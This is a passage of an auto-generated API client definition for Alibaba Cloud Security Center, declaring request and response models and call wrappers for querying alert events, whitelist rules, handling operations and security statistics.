  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI DescribeSecurityCheckScheduleConfig is deprecated
 *
 * @summary Queries the day of a week when custom check tasks are performed and the time range during which the custom check tasks are performed.
 *
 * @description This operation is phased out. You can use the GetCheckConfig operation.
 *
 * @param request DescribeSecurityCheckScheduleConfigRequest
 * @return DescribeSecurityCheckScheduleConfigResponse
 */
// Deprecated
async function describeSecurityCheckScheduleConfig(request: DescribeSecurityCheckScheduleConfigRequest): DescribeSecurityCheckScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityCheckScheduleConfigWithOptions(request, runtime);
}

model DescribeSecurityEventMarkMissListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.

This parameter is required.', example='1'),
  eventName?: string(name='EventName', description='The name of the alert event. The value indicates a subtype.', example='Login with unusual location'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.

This parameter is required.', example='20'),
  remark?: string(name='Remark', description='The condition that is used to query alert events by asset. You can enter an IP address, a public IP address, an internal IP address, or an asset name for fuzzy match.', example='192.168.XX.XX'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='125.210.XX.XX'),
}

model DescribeSecurityEventMarkMissListResponseBody = {
  list?: [ 
    {
      aliUid?: long(name='AliUid', description='The user ID.', example='176618589410****'),
      eventName?: string(name='EventName', description='The name of the alert event. The value indicates a subtype.', example='Login with unusual location'),
      eventNameOriginal?: string(name='EventNameOriginal', description='The name of the alert event. The value indicates a type.', example='login_common_location'),
      eventType?: string(name='EventType', description='The subtype of the alert event.', example='Unusual Logon'),
      eventTypeOriginal?: string(name='EventTypeOriginal', description='The type of the alert event.', example='login_common_location'),
      field?: string(name='Field', description='The field that is used in the whitelist rule.', example='type'),
      fieldValue?: string(name='FieldValue', description='The value of the field.', example='root'),
      filedAliasName?: string(name='FiledAliasName', description='The alias of the field.', example='Logon Time'),
      id?: long(name='Id', description='The ID of the rule.', example='104037'),
      instanceId?: string(name='InstanceId', description='The instance ID of the server.', example='rm-bp1e8t4q15sr3****'),
      instanceName?: string(name='InstanceName', description='The instance name of the asset.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      operate?: string(name='Operate', description='The operator. Valid values:

- **contains**: contains
- **notContains**: does not contain
- **strEqual**: equals
- **strNotEqual**: does not equal
- **regex**: regular expression', example='contains'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='The ID of the rule.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='9'),
    currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='200'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeSecurityEventMarkMissListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSecurityEventMarkMissListResponseBody(name='body'),
}

/**
 * @summary Queries the list of whitelist rules.
 *
 * @param request DescribeSecurityEventMarkMissListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSecurityEventMarkMissListResponse
 */
async function describeSecurityEventMarkMissListWithOptions(request: DescribeSecurityEventMarkMissListRequest, runtime: Util.RuntimeOptions): DescribeSecurityEventMarkMissListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityEventMarkMissList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the list of whitelist rules.
 *
 * @param request DescribeSecurityEventMarkMissListRequest
 * @return DescribeSecurityEventMarkMissListResponse
 */
async function describeSecurityEventMarkMissList(request: DescribeSecurityEventMarkMissListRequest): DescribeSecurityEventMarkMissListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityEventMarkMissListWithOptions(request, runtime);
}

model DescribeSecurityEventOperationStatusRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventIds?: [ string ](name='SecurityEventIds', description='The IDs of the alert events.

>  You must specify at least one of the TaskId and SecurityEventIds parameters.

This parameter is required.', example='["909361"]'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  taskId?: long(name='TaskId', description='The ID of the task that handles the alert events.

>  You must specify at least one of the TaskId and SecurityEventIds parameters.

This parameter is required.', example='12121'),
}

model DescribeSecurityEventOperationStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='1683940A-E4AE-4473-8C40-F4075434B76B'),
  securityEventOperationStatusResponse?: {
    securityEventOperationStatuses?: [ 
      {
        errorCode?: string(name='ErrorCode', description='The code that indicates the handling result of the alert event.', example='ignore.Success'),
        securityEventId?: string(name='SecurityEventId', description='The ID of the alert event.', example='12321'),
        status?: string(name='Status', description='The handling status of the alert event. Valid values:

*   **Processing**: The alert event is being handled.
*   **Success**: The alert event is handled.
*   **Failed**: The alert event failed to be handled.', example='Success'),
      }
    ](name='SecurityEventOperationStatuses', description='An array consisting of the status of the alert events handled by the task.'),
    taskStatus?: string(name='TaskStatus', description='The status of the task that handles the alert events. Valid values:

*   **Processing**: The task is running.
*   **Success**: The task is successful.
*   **Failure**: The task failed.
*   **Pending**: The task is pending.', example='Success'),
  }(name='SecurityEventOperationStatusResponse', description='The information about the task that handles the alert events.'),
}

model DescribeSecurityEventOperationStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSecurityEventOperationStatusResponseBody(name='body'),
}

/**
 * @summary Queries the alert events that are triggered by the same IP address rule or of the same alert type as a specific alert event if you want to handle the specific alert event in batch operation mode.
 *
 * @param request DescribeSecurityEventOperationStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSecurityEventOperationStatusResponse
 */
async function describeSecurityEventOperationStatusWithOptions(request: DescribeSecurityEventOperationStatusRequest, runtime: Util.RuntimeOptions): DescribeSecurityEventOperationStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityEventOperationStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the alert events that are triggered by the same IP address rule or of the same alert type as a specific alert event if you want to handle the specific alert event in batch operation mode.
 *
 * @param request DescribeSecurityEventOperationStatusRequest
 * @return DescribeSecurityEventOperationStatusResponse
 */
async function describeSecurityEventOperationStatus(request: DescribeSecurityEventOperationStatusRequest): DescribeSecurityEventOperationStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityEventOperationStatusWithOptions(request, runtime);
}

model DescribeSecurityEventOperationsRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId', description='The ID of the alert event that you want to handle.

This parameter is required.', example='61352054'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeSecurityEventOperationsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B7A2000F-497E-5DA0-B14D-615CD410DD7E'),
  securityEventOperationsResponse?: [ 
    {
      mappingMarkFields?: [ 
        {
          description?: string(name='Description', description='The description of the field that is added to the whitelist.', example='test'),
          fillType?: string(name='FillType', description='Indicates whether the value of the field can be changed.

*   **CUSTOM**: The value of the field can be changed.
*   **SYSTEM**: The value of the field cannot be changed.', example='CUSTOM'),
          maxLength?: int32(name='MaxLength', description='The maximum length of the field that is added to the whitelist.', example='2048'),
          minLength?: int32(name='MinLength', description='The minimum length of the field that is added to the whitelist.', example='1024'),
          name?: string(name='Name', description='The name of the field that is added to the whitelist.', example='pid'),
          required?: boolean(name='Required', description='Indicates whether the parameter is required. Valid values:

*   **true**
*   **false**', example='true'),
          showName?: string(name='ShowName', description='The display name of the field that can be used in the whitelist rule.', example='pid'),
          showValue?: string(name='ShowValue', description='The display name of the field that is added to the whitelist.', example='1791'),
          value?: string(name='Value', description='The value of the field that is added to the whitelist.', example='1791'),
        }
      ](name='MappingMarkFields', description='The objects on which the operations are performed. This parameter is required when you add the alert to the whitelist by configuring precise defense rules.'),
      markField?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='The alias of the field that is used in the whitelist rule.', example='file path'),
          filedName?: string(name='FiledName', description='The field that is used in the whitelist rule.', example='gmtModified'),
          markMisType?: string(name='MarkMisType', description='The operation that is used in the whitelist rule. Valid values:

*   **contains**: contains
*   **notContains**: does not contain
*   **regex**: regular expression
*   **strEqual**: equals
*   **strNotEqual**: does not equal', example='contains'),
          markMisValue?: string(name='MarkMisValue', description='The value of the field that is used in the whitelist rule.', example='2022-04-25 10:11:04'),
          supportedMisType?: [ string ](name='SupportedMisType', description='An array consisting of the operations that are supported by the method to add the alert event to the whitelist.'),
          uuid?: string(name='Uuid', description='The UUID of the server on which the alert event is detected.', example='3d6b4a75-c28f-447b-9142-38f6252c****'),
        }
      ](name='MarkField', description='The configurations that are used when the value of the OperationCode parameter is **advance_mark_mis_info**.'),
      markFieldsSource?: [ 
        {
          filedAliasName?: string(name='FiledAliasName', description='The alias of the field that can be used in the whitelist rule.', example='file path'),
          filedName?: string(name='FiledName', description='The field that can be used in the whitelist rule.', example='gmtModified'),
          markMisValue?: string(name='MarkMisValue', description='The value of the field that can be used in the whitelist rule.', example='contains'),
          supportedMisType?: [ string ](name='SupportedMisType', description='An array consisting of the operations that are supported by the method to add the alert event to the whitelist.'),
        }
      ](name='MarkFieldsSource', description='The configuration items that can be used when the value of the OperationCode parameter is advance_mark_mis_info.'),
      operationCode?: string(name='OperationCode', description='The operation that is performed to handle the alert. Valid values:

*   **block_ip**: blocks the source IP address.
*   **advance_mark_mis_info**: adds the alert to the whitelist.
*   **ignore**: ignores the alert.
*   **manual_handled**: marks the alert as manually handled.
*   **kill_process**: terminates the malicious process.
*   **cleanup**: performs in-depth virus detection and removal.
*   **kill_and_quara**: terminates the malicious process and quarantines the source file.
*   **disable_malicious_defense**: disables the malicious behavior defense feature.
*   **client_problem_check**: performs troubleshooting.
*   **quara**: quarantines the source file of the malicious process.
*   **defense_mark_mis_info**: enables the precise defense feature but disables the notification feature.
*   **rm_defense_mark_mis_info**: enables the notification feature.
*   **rm_mark_mis_info**: removes the alert from the whitelist.
*   **cancle_manual**: cancels marking the alert as manually handled.', example='advance_mark_mis_info'),
      operationParams?: string(name='OperationParams', description='The configuration of the operation that is performed to handle the alert.

>  If the value of the **OperationCode** parameter is **kill_and_quara** or **block_ip**, the OperationParams parameter is required. If the value of the **OperationCode** parameter is a different value, the OperationParams parameter can be left empty.', example='{"expireTime":1641566807783}'),
      userCanOperate?: boolean(name='UserCanOperate', description='Indicates whether you can handle the alert in the current edition of Security Center. Valid values:

*   **true**
*   **false**', example='false'),
    }
  ](name='SecurityEventOperationsResponse', description='The operations that are performed to handle the alert.'),
}

model DescribeSecurityEventOperationsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSecurityEventOperationsResponseBody(name='body'),
}

/**
 * @summary Queries the operations that you can perform to handle an alert.
 *
 * @param request DescribeSecurityEventOperationsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSecurityEventOperationsResponse
 */
async function describeSecurityEventOperationsWithOptions(request: DescribeSecurityEventOperationsRequest, runtime: Util.RuntimeOptions): DescribeSecurityEventOperationsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityEventOperations',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the operations that you can perform to handle an alert.
 *
 * @param request DescribeSecurityEventOperationsRequest
 * @return DescribeSecurityEventOperationsResponse
 */
async function describeSecurityEventOperations(request: DescribeSecurityEventOperationsRequest): DescribeSecurityEventOperationsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityEventOperationsWithOptions(request, runtime);
}

model DescribeSecurityStatInfoRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', description='The ID of the account that is added to the resource directory as a member for multi-account control. You can use this parameter to query the security status of the account.', example='12345'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model DescribeSecurityStatInfoResponseBody = {
  attackEvent?: {
    dateArray?: [ string ](name='DateArray', description='The points in time when the number of attacks is collected in the trend chart.'),
    totalCount?: int32(name='TotalCount', description='The total number of attacks on the current day.', example='1096'),
    valueArray?: [ string ](name='ValueArray', description='The numbers of attacks at all points in time.'),
  }(name='AttackEvent', description='The detailed statistics of attacks.'),
  healthCheck?: {
    dateArray?: [ string ](name='DateArray', description='The points in time when data of baseline risk items is collected in the trend chart.'),
    highCount?: int32(name='HighCount', description='The number of baseline risk items that have the high-risk level on the current day.', example='10'),
    highList?: [ string ](name='HighList', description='The numbers of baseline risk items that have the high-risk level at all points in time.'),
    levelsOn?: [ string ](name='LevelsOn', description='The risk levels of baseline risk items.'),
    lowCount?: int32(name='LowCount', description='The number of baseline risk items that have the low-risk level on the current day.', example='0'),
    lowList?: [ string ](name='LowList', description='The numbers of baseline risk items that have the low-risk level at all points in time.'),
    mediumCount?: int32(name='MediumCount', description='The number of baseline risk items that have the medium-risk level on the current day.', example='21'),
    mediumList?: [ string ](name='MediumList', description='The numbers of baseline risk items that have the medium-risk level at all points in time.'),
    timeArray?: [ string ](name='TimeArray', description='The time periods during which data of baseline risk items is collected.'),
    totalCount?: int32(name='TotalCount', description='The total number of baseline risk items on the current day.', example='32'),
    valueArray?: [ string ](name='ValueArray', description='The total number of baseline risk items at all points in time.'),
  }(name='HealthCheck', description='The detailed statistics of baseline risk items.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A3E61730-85E2-4789-8017-B9B1B70F0568'),
  securityEvent?: {
    dateArray?: [ string ](name='DateArray', description='The points in time when data of unhandled alerts is collected in the trend chart.'),
    levelsOn?: [ string ](name='LevelsOn', description='The risk levels of unhandled alerts.'),
    remindCount?: int32(name='RemindCount', description='The number of **remind** alerts on the current day.', example='0'),
    remindList?: [ string ](name='RemindList', description='The numbers of remind alerts at all points in time.'),
    seriousCount?: int32(name='SeriousCount', description='The number of **serious** alerts on the current day.', example='404'),
    seriousList?: [ string ](name='SeriousList', description='The numbers of serious alerts at all points in time.'),
    suspiciousCount?: int32(name='SuspiciousCount', description='The number of **suspicious** alerts on the current day.', example='148'),
    suspiciousList?: [ string ](name='SuspiciousList', description='The numbers of suspicious alerts at all points in time.'),
    timeArray?: [ string ](name='TimeArray', description='The time periods during which data of the same alert is collected.'),
    totalCount?: int32(name='TotalCount', description='The total number of unhandled alerts on the current day.', example='552'),
    valueArray?: [ string ](name='ValueArray', description='The numbers of unhandled alerts at all points in time.'),
  }(name='SecurityEvent', description='The detailed statistics of unhandled alerts.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  vulnerability?: {
    asapCount?: int32(name='AsapCount', description='The number of **high-risk** unfixed vulnerabilities on the current day.', example='109'),
    asapList?: [ string ](name='AsapList', description='The numbers of high-risk unfixed vulnerabilities at all points in time.'),
    dateArray?: [ string ](name='DateArray', description='The points in time when data of unfixed vulnerabilities is collected in the trend chart.'),
    laterCount?: int32(name='LaterCount', description='The number of **medium-risk** unfixed vulnerabilities on the current day.', example='275'),
    laterList?: [ string ](name='LaterList', description='The numbers of medium-risk unfixed vulnerabilities at all points in time.'),
    levelsOn?: [ string ](name='LevelsOn', description='The risk levels of unfixed vulnerabilities.'),
    nntfCount?: int32(name='NntfCount', description='The number of **low-risk** unfixed vulnerabilities on the current day.', example='0'),
    nntfList?: [ string ](name='NntfList', description='The numbers of low-risk unfixed vulnerabilities at all points in time.'),
    timeArray?: [ string ](name='TimeArray', description='The time periods during which data of unfixed vulnerabilities is collected.'),
    totalCount?: int32(name='TotalCount', description='The total number of unfixed vulnerabilities on the current day.', example='384'),
    valueArray?: [ string ](name='ValueArray', description='The numbers of unfixed vulnerabilities at all points in time.'),
  }(name='Vulnerability', description='The detailed statistics of unfixed vulnerabilities.'),
}

model DescribeSecurityStatInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSecurityStatInfoResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of each security check item and the daily statistics in the trend chart based on each security check item.
 *
 * @param request DescribeSecurityStatInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSecurityStatInfoResponse
 */
async function describeSecurityStatInfoWithOptions(request: DescribeSecurityStatInfoRequest, runtime: Util.RuntimeOptions): DescribeSecurityStatInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSecurityStatInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of each security check item and the daily statistics in the trend chart based on each security check item.
 *
 * @param request DescribeSecurityStatInfoRequest
 * @return DescribeSecurityStatInfoResponse
 */
async function describeSecurityStatInfo(request: DescribeSecurityStatInfoRequest): DescribeSecurityStatInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSecurityStatInfoWithOptions(request, runtime);
}

model DescribeServiceLinkedRoleStatusRequest {
  serviceLinkedRole?: string(name='ServiceLinkedRole', description='The service-linked role. Default value: **AliyunServiceRoleForSas**. Valid values:

*   **AliyunServiceRoleForSas**: the service-linked role of Security Center. Security Center assumes this role to access the resources of other cloud services within your account.
*   **AliyunServiceRoleForSasCspm**: the service-linked role of Security Center-CSPM. Security Center-CSPM assumes this role to access the resources of other cloud services within your account.', example='AliyunServiceRoleForSas'),
}

model DescribeServiceLinkedRoleStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='39CE98F4-88C0-4539-B906-6B542E5C07B9'),
  roleStatus?: {
    status?: boolean(name='Status', description='Indicates whether the service-linked role is created. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  }(name='RoleStatus', description='The status information about the service-linked role.'),
}

model DescribeServiceLinkedRoleStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeServiceLinkedRoleStatusResponseBody(name='body'),
}

/**
 * @summary Checks whether a service-linked role is created for Security Center.
 *
 * @param request DescribeServiceLinkedRoleStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeServiceLinkedRoleStatusResponse
 */
async function describeServiceLinkedRoleStatusWithOptions(request: DescribeServiceLinkedRoleStatusRequest, runtime: Util.RuntimeOptions): DescribeServiceLinkedRoleStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.serviceLinkedRole)) {
    query['ServiceLinkedRole'] = request.serviceLinkedRole;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeServiceLinkedRoleStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Checks whether a service-linked role is created for Security Center.
 *
 * @param request DescribeServiceLinkedRoleStatusRequest
 * @return DescribeServiceLinkedRoleStatusResponse
 */
async function describeServiceLinkedRoleStatus(request: DescribeServiceLinkedRoleStatusRequest): DescribeServiceLinkedRoleStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeServiceLinkedRoleStatusWithOptions(request, runtime);
}

model DescribeSimilarEventScenariosRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId', description='The ID of the alert event.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the ID of the alert event.

This parameter is required.', example='12321'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model DescribeSimilarEventScenariosResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='FDF7B8D9-8493-4B90-8D13-E0C1FFCE5F97'),
  scenarios?: [ 
    {
      code?: string(name='Code', description='The code of the scenario. Valid values:

*   **default**: the same alert type
*   **same_file_content**: the same file content rule.
*   **same_ip**: the same IP address rule.
*   **same_url**: the same URL rule.', example='same_url'),
    }
  ](name='Scenarios', description='The scenarios in which alerts triggered by the same rule or rules of the same type are handled.'),
}

model DescribeSimilarEventScenariosResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSimilarEventScenariosResponseBody(name='body'),
}

/**
 * @summary Queries the scenarios in which alerts triggered by the same rule or rules of the same type are handled.
 *
 * @param request DescribeSimilarEventScenariosRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSimilarEventScenariosResponse
 */
async function describeSimilarEventScenariosWithOptions(request: DescribeSimilarEventScenariosRequest, runtime: Util.RuntimeOptions): DescribeSimilarEventScenariosResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSimilarEventScenarios',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the scenarios in which alerts triggered by the same rule or rules of the same type are handled.
 *
 * @param request DescribeSimilarEventScenariosRequest
 * @return DescribeSimilarEventScenariosResponse
 */
async function describeSimilarEventScenarios(request: DescribeSimilarEventScenariosRequest): DescribeSimilarEventScenariosResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSimilarEventScenariosWithOptions(request, runtime);
}

model DescribeSimilarSecurityEventsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  taskId?: long(name='TaskId', description='The task ID. You can call the [CreateSimilarSecurityEventsQueryTask](~~CreateSimilarSecurityEventsQueryTask~~) operation to obtain the task ID.

This parameter is required.', example='1689135'),
}

model DescribeSimilarSecurityEventsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='5'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='5'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9F4217C8-763F-51EF-84D4-5535E072B2D8'),
  securityEventsResponse?: [ 
    {
      eventName?: string(name='EventName', description='The name of the alert event.', example='Trojan'),
      eventType?: string(name='EventType', description='The type of the alert event. Valid values:

*   Suspicious Process
*   Webshell
*   Unusual Logon
*   Malicious Software
*   Sensitive File Tampering
*   Unusual Network Connection
*   Other
*   Suspicious Account
*   Cloud threat detection
*   Precision defense
*   Application Whitelist
*   Persistence
*   Web Application Threat Detection
*   Malicious scripts
*   Malicious Network Activity
*   K8s Abnormal Behavior
*   Website backdoor (local engine)
*   Exploit
*   Image Scan
*   Trusted exception

For more information about alert types, see [Overview](https://help.aliyun.com/document_detail/68388.html).', example='Malicious Software'),
      lastTime?: long(name='LastTime', description='The timestamp generated when the alert event was last detected. Unit: milliseconds.', example='1648544361480'),
      occurrenceTime?: long(name='OccurrenceTime', description='The timestamp generated when the alert event was first detected. Unit: milliseconds.', example='1648457961000'),
      securityEventId?: long(name='SecurityEventId', description='The ID of the alert event.', example='158661'),
      uuid?: string(name='Uuid', description='The UUID of the server that was affected by the alert event.', example='qweeqq-13232-daweq-w****'),
    }
  ](name='SecurityEventsResponse', description='The information about the alert events that are triggered by the same rule or of the same alert type.'),
}

model DescribeSimilarSecurityEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSimilarSecurityEventsResponseBody(name='body'),
}

/**
 * @summary Queries alert events that are triggered by the same rule or of the same alert type.
 *
 * @param request DescribeSimilarSecurityEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSimilarSecurityEventsResponse
 */
async function describeSimilarSecurityEventsWithOptions(request: DescribeSimilarSecurityEventsRequest, runtime: Util.RuntimeOptions): DescribeSimilarSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
